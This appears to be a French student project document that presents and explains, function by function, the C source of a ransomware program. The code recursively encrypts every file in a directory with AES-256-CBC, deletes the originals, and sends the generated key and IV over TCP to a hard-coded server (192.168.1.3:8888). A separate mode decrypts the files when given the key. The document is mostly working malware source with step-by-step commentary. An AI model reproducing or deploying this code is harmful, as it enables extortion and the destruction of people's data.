
#Pour Ransom.c

```bash
void usage();
```

/*
La fonction usage() sert à afficher des informations sur l'utilisation du programme, comme les options disponibles et comment les utiliser.
*/
```bash
int is_encrypted(char *filename);
```
/*
La fonction is_encrypted() vérifie si un fichier est chiffré ou non.
*/
```bash
void listdir( const char *name, unsigned char *iv, unsigned char *key, char de_flag);
```
/*
La fonction listdir() parcourt un répertoire et ses sous-répertoires et affiche le contenu. Elle prend en paramètre le nom du répertoire à parcourir, ainsi que 
l'initialisation vector (IV) et la clé de chiffrement à utiliser. Elle prend également un flag indiquant si le contenu doit être déchiffré ou non.
*/
```bash
int generate_key(unsigned char *key, int sizeKey, unsigned char *iv, int sizeIv,char *pKey, char *pIv);
```
/*
La fonction generate_key() génère une clé de chiffrement et un IV. Elle prend en paramètre la clé et l'IV générés, ainsi que leur taille, 
et deux chaines de caractères qui recevront la clé et l'IV sous forme de chaîne de caractères.
*/
```bash
int send_key(char *pKey, char *pIv);
```
/*
La fonction send_key() envoie la clé de chiffrement et l'IV générés à une destination spécifiée. Elle prend en paramètre la clé et l'IV sous forme de chaîne de caractères.
*/

//affiche l'aide

```bash
void usage(){
	printf("Projet Ransomware Kyllian Louis \n\
	Utilisation : \n\
	\transom [DIRECTORY]\t utilisé pour chiffrer le dossier donné en paramètre.\n\
	\transom [DIRECTORY] -d [KEY] [IV]\t utilisé pour déchiffrer le dossier donné en paramètre.\n\
	\transom\tdonné sans paramètre ou lors d'un appel invalide fait apparaitre ce menu d'aide utilisateur.");
}
```

/*	in : nom du répertoire, vecteur d'initialisation, clé de chiffrement, drapeau avec la valeur ENCRYPT_FLAG ou DECRYPT_FLAG
*	out : rien
*
*	parcourt l'arborescence des fichiers, appel récursive
*/
```bash
void listdir(const char *name, unsigned char *iv, unsigned char *key, char de_flag){
	DIR *dir = opendir(name);
	if (dir != NULL) {
		
		struct dirent *directoryStruct = readdir(dir);
		while(directoryStruct  != NULL) {
			if(	strcmp(directoryStruct->d_name,".") != 0 
				&& strcmp(directoryStruct->d_name,"..") != 0
			) {
				char *namesub = (char*)malloc((strlen(name) + 2 + strlen(directoryStruct->d_name) )*sizeof(char));
				if (namesub != NULL) {
					sprintf(namesub, "%s/%s", name, directoryStruct->d_name);
					if (directoryStruct->d_type == DT_DIR) {
						listdir(namesub,iv,key,de_flag);
							
					} else {
						struct stat sb;
						switch(de_flag) {
							case ENCRYPT_FLAG : 
									stat(namesub, &sb);
									if(is_encrypted(namesub) != TRUE && sb.st_size < SIZE_LIMITE ){
										encrypt(key,iv,namesub);
										remove (namesub);
									}
									break;
							case DECRYPT_FLAG : 
									if(is_encrypted(namesub)== TRUE){
										decrypt(key,iv,namesub);
										remove(namesub);
									}
									break;
							default : printf("Appel illégitime.\n");
						}
					}
					printf("%s\n",namesub);
					free(namesub);
				} else {
					printf("Surcharge mémoire.\n");
				}
			}
			directoryStruct = readdir(dir);
		}
		closedir(dir);
	}
	else {
		printf("Erreur, répertoire inconnu.");
	}
}
```
/*La fonction 'listdir' a pour but de parcourir récursivement tous les fichiers et répertoires contenus dans un répertoire donné en argument.

Elle prend en argument:

'name', qui est le nom du répertoire à parcourir,
'iv', qui est un pointeur sur un tableau de caractères contenant l'initialisation du vecteur utilisé pour le chiffrement ou le déchiffrement des fichiers,
'key', qui est un pointeur sur un tableau de caractères contenant la clé utilisée pour le chiffrement ou le déchiffrement des fichiers,
'de_flag', qui est un caractère indiquant si l'on souhaite chiffrer ('ENCRYPT_FLAG') ou déchiffrer ('DECRYPT_FLAG') les fichiers.
Elle commence par ouvrir le répertoire 'name' grâce à la fonction 'opendir'. Si le répertoire ne peut pas être ouvert, elle affiche un message d'erreur. 
Sinon, elle parcourt tous les éléments du répertoire grâce à la fonction 'readdir'. Pour chaque élément, elle vérifie que ce n'est pas un des 
répertoires spéciaux '.' ou '..' (qui correspondent au répertoire courant et au répertoire parent).

Si l'élément est un répertoire, elle appelle récursivement la fonction 'listdir' sur ce répertoire. Si c'est un fichier, 
elle vérifie si celui-ci doit être chiffré ou déchiffré grâce au paramètre 'de_flag', et utilise la fonction 'encrypt' ou 'decrypt' en conséquence. 
Si 'de_flag' vaut autre chose que 'ENCRYPT_FLAG' ou 'DECRYPT_FLAG', elle affiche un message d'erreur.

Enfin, elle affiche le nom du fichier ou répertoire traité et libère la mémoire allouée pour stocker son nom. Si la mémoire n'a pas pu être allouée, 
elle affiche un message d'erreur.

Une fois tous les éléments du répertoire traités, la fonction ferme le répertoire grâce à la fonction 'closedir'.
*/

/*	in : filename
*	out : TRUE (0) = encrypted .. FALSE (-1) = non_encrypted
*	vérifie uniquement si l'extension du fichier est ENCRYPT_EXT ou non
*/

```bash
int is_encrypted(char *filename){

	char * extension = strrchr(filename, '.');
	if (extension != NULL && strcmp(extension + 1, ENCRYPT_EXT) == 0) {
		return 0;
	}
	return -1;
}
```
/*
La fonction 'is_encrypted' a pour but de vérifier si un fichier donné en argument a été chiffré ou non.

Elle prend en argument:

'filename', qui est le nom du fichier à vérifier.
Elle commence par rechercher l'extension du fichier grâce à la fonction 'strrchr', qui renvoie un pointeur sur le dernier caractère '.' dans la chaîne de caractères 'filename'. 
Si l'extension n'a pas été trouvée (c'est-à-dire si le fichier n'a pas d'extension), la fonction renvoie -1.

Sinon, elle compare l'extension du fichier avec l'extension de chiffrement 'ENCRYPT_EXT' grâce à la fonction 'strcmp'. 
Si l'extension du fichier est égale à 'ENCRYPT_EXT', la fonction renvoie 0 pour indiquer que le fichier est chiffré. Sinon, elle renvoie -1 pour indiquer qu'il n'est pas chiffré.

#strrchr
La fonction 'strrchr' est une fonction de la bibliothèque string.h qui permet de rechercher la dernière occurence d'un caractère donné dans une chaîne de caractères. 
Elle prend en argument:

'str', qui est un pointeur sur la chaîne de caractères dans laquelle rechercher le caractère,
'c', qui est le caractère à rechercher.
La fonction renvoie un pointeur sur le dernier caractère 'c' dans la chaîne 'str', ou NULL si 'c' n'a pas été trouvé dans 'str'.

#occurence
Une occurence d'un élément (dans ce cas, d'un caractère) dans une chaîne de caractères correspond à sa position dans la chaîne. 
Par exemple, si la chaîne de caractères 'abcde' contient les caractères 'a', 'b', 'c', 'd' et 'e', l'occurence du caractère 'c' dans cette chaîne est la troisième, 
car il se trouve à la troisième position.

La fonction 'strrchr' permet de rechercher la dernière occurence d'un caractère donné dans une chaîne de caractères. 
Par exemple, si on utilise 'strrchr' pour rechercher le caractère 'd' dans la chaîne 'abcdeabcdeabcde', 
elle renvoie un pointeur sur le dernier caractère 'd' dans la chaîne, qui est en dixième position.
*/

```bash
int main (int argc, char * argv[])
{
	
	if (argc == 2 ) {
		char * name = argv[1];
		unsigned char iv[AES_BLOCK_SIZE * sizeof(char)];
		unsigned char key[AES_256_KEY_SIZE * sizeof(char)];
		char pIv[AES_BLOCK_SIZE * 2 * sizeof(char)];
		char pKey[AES_256_KEY_SIZE * 2 * sizeof(char)];

		generate_key(key,AES_256_KEY_SIZE, iv, AES_BLOCK_SIZE, pKey, pIv);
		send_key(pKey,pIv);
		listdir(name,iv,key,ENCRYPT_FLAG);

		memset(iv, 0, AES_BLOCK_SIZE * sizeof(char));
		memset(key, 0, AES_256_KEY_SIZE * sizeof(char));
		memset(pIv, 0, AES_BLOCK_SIZE * 2 * sizeof(char));
		memset(pKey, 0, AES_256_KEY_SIZE * 2 * sizeof(char));
	} else {
		//
		// ./ransom DIRECTORY -d KEY IV
		//
		if (argc == 5 && strcmp(argv[2],"-d") == 0) {
			char * name = argv[1];
			char * pKey = argv[3];
			char * pIv = argv[4];

			unsigned char iv[AES_BLOCK_SIZE * sizeof(char)];
			unsigned char key[AES_256_KEY_SIZE * sizeof(char)];

			hexa_to_bytes(pIv,iv,AES_BLOCK_SIZE);
			hexa_to_bytes(pKey,key,AES_256_KEY_SIZE);
			
			listdir(name,iv,key,DECRYPT_FLAG);
		} else {
			usage();
		}
	}
	
}
```
/*
La fonction 'main' est la fonction principale du programme. Elle est exécutée lorsque le programme est lancé. Elle prend en argument:

'argc', qui est le nombre d'arguments passés en ligne de commande lorsque le programme est lancé,
'argv', qui est un tableau de chaînes de caractères contenant les arguments passés en ligne de commande.

La fonction commence par vérifier le nombre d'arguments passés en ligne de commande. 
Si 'argc' vaut 2, cela signifie qu'un seul argument a été passé: le nom du répertoire à chiffrer. 
Dans ce cas, la fonction génère une clé et un vecteur d'initialisation aléatoires grâce à la fonction 'generate_key', 
puis envoie ces informations à un serveur grâce à la fonction 'send_key'. 
Enfin, elle parcourt récursivement tous les fichiers et répertoires du répertoire donné en argument grâce à la fonction 'listdir', en utilisant la clé et le vecteur 
d'initialisation pour chiffrer les fichiers qui ne sont pas déjà chiffrés et qui ont une taille inférieure à la limite 'SIZE_LIMITE'.

La fonction 'main' vérifie également le cas où 'argc' vaut 5 et que le deuxième argument est '-d'. 
Dans ce cas, cela signifie que deux autres arguments ont été passés: la clé de déchiffrement et le vecteur d'initialisation. 
Dans ce cas, la fonction convertit ces informations depuis leur représentation hexadécimale (passée en ligne de commande) 
vers leur représentation binaire grâce à la fonction 'hexa_to_bytes', puis parcourt récursivement tous les fichiers et répertoires du répertoire donné 
en argument grâce à la fonction 'listdir', en utilisant la clé et le vecteur d'initialisation pour déchiffrer les fichiers chiffrés.

Enfin, si aucun de ces cas n'est vrai, cela signifie que le nombre d'arguments ou leur contenu est incorrect, et la fonction 'usage' est appelée pour afficher 
les instructions d'utilisation du programme.
*/


/*	in : *pkey adresse au format hexa key, *pIv adresse au format hexa init vector
*	out : /
*	Envoie la clé/IV via une prise
*
*   code fait par Denis 
*/
```bash
int send_key(char *pKey, char *pIv){
	char msg[4096];
	sprintf(msg,"KEY : %s\nIV : %s\n",pKey,pIv);
	int sockid;
	int server_port= 8888;
	char *server_ip = "192.168.1.3";
	sockid = socket(AF_INET,SOCK_STREAM,0);
	struct sockaddr_in server_addr;
	server_addr.sin_family = AF_INET;
	server_addr.sin_port = htons(server_port);
	server_addr.sin_addr.s_addr = inet_addr(server_ip);
	connect(sockid,(struct sockaddr *)&server_addr, sizeof(server_addr));
	send(sockid,(const char *)msg, strlen(msg),0);
	close(sockid);
	memset(msg,0,BUFSIZE);
	return 0;
}
```

/*
La fonction 'send_key' envoie la clé de chiffrement et le vecteur d'initialisation à un serveur à l'adresse IP 'server_ip' sur le port 'server_port' en utilisant le protocole TCP.

Pour cela, elle commence par créer une socket (un point de communication entre le programme et le réseau) avec la fonction 'socket', 
puis configure l'adresse et les informations du serveur avec lesquelles elle souhaite communiquer grâce à la structure 'sockaddr_in'. 
Ensuite, elle utilise la fonction 'connect' pour établir une connexion avec le serveur.

Une fois la connexion établie, elle utilise la fonction 'send' pour envoyer la clé et le vecteur d'initialisation au serveur sous forme de chaîne de caractères. 
Enfin, elle ferme la connexion et nettoie les variables utilisées avant de quitter.

Voici en détail ce qui se passe dans la fonction 'send_key':

1. La fonction crée un message en concaténant la clé et le vecteur d'initialisation dans une chaîne de caractères en utilisant la fonction 'sprintf'. 
Le message est stocké dans une variable 'msg' de taille 4096 octets.

2. Elle crée une socket 'sockid' en appelant la fonction 'socket' avec les arguments suivants:

	AF_INET: cela spécifie qu'on utilise le protocole IPv4 pour la communication réseau.
	SOCK_STREAM: cela indique qu'on utilise un flux de données TCP (qui garantit que les données seront reçues dans l'ordre et sans erreur).
	0: cet argument spécifie le protocole à utiliser par défaut (en l'occurrence, TCP).
	
3. Elle crée une structure 'sockaddr_in' 'server_addr' pour stocker les informations de l'adresse du serveur. Cette structure contient les champs suivants:
	sin_family: cela spécifie le type de l'adresse (AF_INET dans ce cas).
	sin_port: cela indique le numéro de port sur lequel le serveur écoute (8888 dans ce cas).
	sin_addr: cela contient l'adresse IP du serveur (192.168.1.3 dans ce cas).
	
4. Elle utilise la fonction 'connect' pour établir une connexion avec le serveur. 
Elle passe à cette fonction l'identifiant de la socket 'sockid', l'adresse du serveur sous forme de pointeur sur 'sockaddr_in' ('server_addr') et sa taille.
*/
5. Elle utilise la fonction 'send' pour envoyer le message au serveur. 
Elle passe à cette fonction l'identifiant de la socket 'sockid', le pointeur sur le message à envoyer ('msg'), 
sa taille (calculée grâce àstrlen') et enfin un drapeau 'flag' à 0 pour indiquer qu'on envoie le message en une seule fois.

6. Elle ferme la socket avec la fonction 'close' pour libérer les ressources système utilisées.

7. Enfin, elle efface le contenu de la variable 'msg' en utilisant 'memset' avant de quitter la fonction.
*/

/*	in : *key où sera stockée la clé (format binaire), taille de la clé,
* iv où sera stocké le vecteur d'initialisation (format binaire), taille du vecteur d'initialisation,
* pKey où sera stockée la clé (format hexa), *pIv où sera stocké le vecteur d'initialisation (format hexa)
* out : génère la clé et le vecteur d'initialisation de manière pseudo-aléatoire (aux formats binaire et hexa)
*/

```bash
int generate_key(unsigned char *key, int sizeKey, unsigned char *iv, int sizeIv,char *pKey, char *pIv){

	RAND_bytes(key, sizeKey);
	RAND_bytes(iv, sizeIv);

	bytes_to_hexa(iv,pIv,sizeIv);
	bytes_to_hexa(key,pKey,sizeKey);
	return 0;

}
```

/*
Cette fonction sert à générer une clé et un vecteur d'initialisation aléatoires pour chiffrer et déchiffrer les fichiers du répertoire, 
et à les convertir en chaînes de caractères hexadécimales pour les envoyer au serveur.

1. La fonction utilise la fonction 'RAND_bytes' de la bibliothèque OpenSSL pour générer des données aléatoires et les stocker dans les variables 'key' et 'iv'. 
La longueur de ces données est définie par les arguments 'sizeKey' et 'sizeIv'.

2. Elle convertit les données binaires stockées dans 'iv' et 'key' en chaînes de caractères hexadécimales grâce à la fonction 'bytes_to_hexa' et 
stocke le résultat dans les variables 'pIv' et 'pKey'.

3. Elle termine en retournant 0.
*/

#ransomlib.c 

/* in : key, vecteur d'initialisation, fichié non chiffré
*  out: fichié chiffré
*	fonction qui chiffre les fichiers
*/

```bash
int encrypt(unsigned char *key, unsigned char *iv, char *plaintext_file)
{
    EVP_CIPHER_CTX *ctx;
    const EVP_CIPHER *cipher_type = EVP_aes_256_cbc();
    int cipher_block_size = EVP_CIPHER_block_size(cipher_type);
    unsigned char in_buf[BUFSIZE], out_buf[BUFSIZE + cipher_block_size];
    int num_bytes_read, out_len;
    int len;

    FILE *fIN = fopen(plaintext_file,"rb");
    if(fIN==NULL)
    {
       handleErrors();
    }
    char encrypted_file[1024];
    snprintf(encrypted_file,sizeof(encrypted_file),"%s.%s",plaintext_file,ENCRYPT_EXT);
    printf("%s\n",encrypted_file);
    FILE *fOUT = fopen(encrypted_file,"wb");
    if(fOUT==NULL)
    {
       handleErrors();
    }
    
    /* Create and initialise the context */
    if(!(ctx = EVP_CIPHER_CTX_new()))
        handleErrors();

    /*
	 * Initialisez l'opération de chiffrement. IMPORTANT - assurez-vous d'utiliser une clé
     * et taille IV appropriée pour votre chiffrement
     * Dans cet exemple, nous utilisons AES 256 bits (c'est-à-dire une clé de 256 bits). Le
     * La taille IV pour *la plupart* des modes est la même que la taille du bloc. Pour AES ceci
     * est de 128 bits
     */
    if(1 != EVP_EncryptInit_ex(ctx, EVP_aes_256_cbc(), NULL, key, iv))
        handleErrors();

    /*
     * Fournissez le message à chiffrer et obtenez la sortie chiffrée.
     * EVP_EncryptUpdate peut être appelé plusieurs fois si nécessaire
     */
    num_bytes_read = fread(in_buf, sizeof(unsigned char), BUFSIZE, fIN);

    while(num_bytes_read > 0)
    {   
    	if(!EVP_EncryptUpdate(ctx, out_buf, &out_len, in_buf, num_bytes_read)){
			handleErrors();}

	fwrite(out_buf, sizeof(unsigned char), out_len, fOUT);
	num_bytes_read = fread(in_buf, sizeof(unsigned char), BUFSIZE, fIN);

    }
    if(1 != EVP_EncryptFinal_ex(ctx, out_buf, &out_len))
        handleErrors();

    /*
     * Finalisez le cryptage. D'autres octets de texte chiffré peuvent être écrits à
     * cette étape.
     */

    fwrite(out_buf, sizeof(unsigned char), out_len, fOUT);

    /* Clean up */
    EVP_CIPHER_CTX_free(ctx);
   
    fclose(fIN);
    fclose(fOUT);

    return 0;
}
```

/*
La fonction 'encrypt' prend en entrée une clé de chiffrement ('key'), un vecteur d'initialisation ('iv') et le nom du fichier à chiffrer ('plaintext_file'). 
Elle utilise l'algorithme de chiffrement AES en mode CBC (Cipher Block Chaining) avec une clé de 256 bits pour chiffrer le contenu du fichier donné en entrée.

Elle commence par ouvrir le fichier à chiffrer en mode lecture binaire ('rb') et le fichier de sortie (le fichier chiffré) en mode écriture binaire ('wb'). 
Si l'un de ces fichiers n'est pas ouvert correctement, la fonction 'handleErrors' est appelée.

La fonction 'EVP_EncryptInit_ex' initialise l'opération de chiffrement en spécifiant l'algorithme de chiffrement ('EVP_aes_256_cbc'), 
le contexte de chiffrement ('ctx'), la clé de chiffrement ('key') et le vecteur d'initialisation ('iv').

La fonction 'EVP_EncryptUpdate' chiffre une partie du message en entrée et envoie le résultat dans le tampon de sortie ('out_buf'). 
Elle prend en entrée le contexte de chiffrement, le tampon de sortie, la taille du tampon de sortie et les données à chiffrer. Elle peut être appelée plusieurs fois pour chiffrer l'intégralité d'un message de grande taille.

La fonction 'EVP_EncryptFinal_ex' finalise l'opération de chiffrement et écrit tous les octets de texte chiffré restants dans le tampon de sortie.

Ensuite, la fonction écrit le contenu du tampon de sortie dans le fichier chiffré et libère le contexte de chiffrement avec 'EVP_CIPHER_CTX_free'. 
Elle ferme enfin les fichiers ouverts et retourne 0.
*/


/* 
*	in: rien
*	out: rien
*	fait aborder le programme dans le cas ou il y a un problème
*/

```bash
void handleErrors(void)
{
    ERR_print_errors_fp(stderr);
    abort();
}
```

/*
La fonction 'handleErrors' est appelée lorsqu'une erreur est rencontrée dans le programme. 
Elle affiche les erreurs enregistrées par OpenSSL dans la sortie standard d'erreur (stderr) et termine le programme avec une erreur grâce à la fonction 'abort'. 
Cette fonction est utile pour le débogage, car elle permet de voir les erreurs rencontrées dans le programme.
*/

/* 
*	in: chaine de byte, chaine de hexa, la taille
*	out: rien
*	passe du bytes vers l'hexa
*/
```bash
int bytes_to_hexa(const unsigned char bytes_string[], char *hex_string, int size)
{
    for (size_t i = 0; i < size; i++) {
        hex_string += sprintf(hex_string, "%.2x", bytes_string[i]);
    }
}
```
/*
La fonction 'bytes_to_hexa' prend en entrée un tableau de caractères 'bytes_string', une chaîne de caractères 'hex_string' et un entier 'size'. 
Elle convertit chaque octet contenu dans 'bytes_string' en son équivalent en hexadécimal et l'ajoute à 'hex_string'. 
Par exemple, si 'bytes_string' contient les octets 0x01, 0xA0 et 0xFF, 'hex_string' contiendra "01A0FF" à la fin de l'exécution de la fonction.

La fonction utilise la fonction 'sprintf' pour écrire le résultat de la conversion dans 'hex_string'. 
Elle utilise le format "%.2x" pour indiquer qu'elle souhaite écrire chaque octet sous forme hexadécimale sur 2 caractères. 
Si l'octet est inférieur à 16, 'sprintf' ajoutera un zéro devant pour obtenir 2 caractères.

La fonction retourne 0 en cas de succès.
*/

/*
*	in: chaine de hexa, valeur, taille
*	out: rien
*	passe de l'hexa vers le bytes
*/

```bash
void hexa_to_bytes(char hex_string[], unsigned char val[], int size)
{
    char *pos = hex_string;

    for (size_t count = 0; count < size; count++) {
        sscanf(pos, "%2hhx", &val[count]);
        pos += 2;
    }
}
```
/*
La fonction 'hexa_to_bytes' convertit une chaîne de caractères hexadécimaux en un tableau d'octets. 
La chaîne de caractères hexadécimaux est passée en argument sous forme de tableau de caractères 'hex_string' et la valeur convertie est stockée dans le tableau d'octets 'val'. 
Le nombre d'octets à convertir est déterminé par la variable 'size'.

La fonction utilise la fonction 'sscanf' pour lire deux caractères hexadécimaux à chaque itération et les stocker dans un octet du tableau 'val'. 
'pos' est un pointeur qui parcourt la chaîne de caractères hexadécimaux deux caractères à la fois, grâce à l'instruction 'pos += 2;'.
*/

/*
*	in: key, vecteur d'initialisation, fichier chiffrer
*	out: fichier déchiffrer
*	fonction qui permet de déchiffrer
*/
```bash
int decrypt(unsigned char *key, unsigned char *iv, char *cipher_file)
{
    EVP_CIPHER_CTX *ctx;
    const EVP_CIPHER *cipher_type = EVP_aes_256_cbc();
    int cipher_block_size = EVP_CIPHER_block_size(cipher_type);
    unsigned char in_buf[BUFSIZE], out_buf[BUFSIZE + cipher_block_size];
    int num_bytes_read, out_len;
    int len;

    FILE *fIN = fopen(cipher_file,"rb");
    if(fIN==NULL)
    {
       handleErrors();
    }
    char plaintext_file[1024];
    snprintf(plaintext_file,strlen(cipher_file)-(EXT_LEN),"%s",cipher_file);
    FILE *fOUT = fopen(plaintext_file,"wb");
    if(fOUT==NULL)
    {
       handleErrors();
    }


    /* créé et initialise le contexte: code venant de stackoverflow */
    if(!(ctx = EVP_CIPHER_CTX_new()))
        handleErrors();

    /*
     * Initialiser l'opération de déchiffrement. IMPORTANT - assurez-vous d'utiliser une clé
     * et taille IV appropriée pour votre chiffrement
     * Dans cet exemple, nous utilisons AES 256 bits (c'est-à-dire une clé de 256 bits). Le
     * La taille IV pour *la plupart* des modes est la même que la taille du bloc. Pour AES ceci
     * est de 128 bits
     */
    if(1 != EVP_DecryptInit_ex(ctx, EVP_aes_256_cbc(), NULL, key, iv))
        handleErrors();

    /*
     * Fournissez le message à déchiffrer et obtenez la sortie en clair.
     * EVP_DecryptUpdate peut être appelé plusieurs fois si nécessaire.
     */
    num_bytes_read = fread(in_buf, sizeof(unsigned char), BUFSIZE, fIN);

    while(num_bytes_read > 0)
    {
        if(!EVP_DecryptUpdate(ctx, out_buf, &out_len, in_buf, num_bytes_read)){
                        handleErrors();}

        fwrite(out_buf, sizeof(unsigned char), out_len, fOUT);
        num_bytes_read = fread(in_buf, sizeof(unsigned char), BUFSIZE, fIN);
 
    }
   if(1 != EVP_DecryptFinal_ex(ctx, out_buf, &out_len))
        handleErrors();

    fwrite(out_buf, sizeof(unsigned char), out_len, fOUT);

    

    /* Clean up */
    fclose(fOUT);
    fclose(fIN);
    EVP_CIPHER_CTX_free(ctx);

    return 0;
}
```
/*
La fonction decrypt prend en entrée une clé de chiffrement, un vecteur d'initialisation (IV) et le nom d'un fichier de texte chiffré. 
Elle utilise ces informations pour déchiffrer le contenu du fichier et l'enregistrer dans un nouveau fichier.

1. Elle déclare et initialise une variable de type EVP_CIPHER_CTX qui sera utilisée pour déchiffrer le texte. 

2. Elle ouvre le fichier de texte chiffré en lecture (fIN) et vérifie s'il a pu être ouvert correctement. 
Si ce n'est pas le cas, elle appelle la fonction handleErrors qui affiche un message d'erreur et arrête le programme.

3. Elle crée le nom du fichier de texte en clair en enlevant l'extension '.ENC' du nom du fichier de texte chiffré. 
Elle ouvre ce fichier en écriture (fOUT) et vérifie s'il a pu être ouvert correctement. Si ce n'est pas le cas, elle appelle la fonction handleErrors.

4. Elle initialise l'opération de déchiffrement en utilisant la clé et l'IV fournis en entrée, ainsi que l'algorithme de chiffrement AES 256 bits en mode CBC (Cipher Block Chaining).

5. Elle utilise la fonction fread pour lire le contenu du fichier chiffré par paquets de taille BUFSIZE. 
Pour chaque paquet lu, elle utilise la fonction EVP_DecryptUpdate pour mettre à jour l'opération de déchiffrement avec le paquet lu et écrire le résultat dans out_buf.

6. Ensuite, elle utilise la fonction fwrite pour écrire le contenu de out_buf dans le fichier en clair.

7.  Une fois qu'elle a lu l'ensemble du fichier chiffré, elle utilise la fonction EVP_DecryptFinal_ex pour finaliser l'opération de déchiffrement et écrire le résultat dans out_buf. 
Elle utilise de nouveau fwrite pour écrire le contenu de out_buf dans le fichier en clair.

8. Enfin, elle ferme les fichiers en entrée et en sortie, libère le contexte de chiffrement et renvoie 0.
*/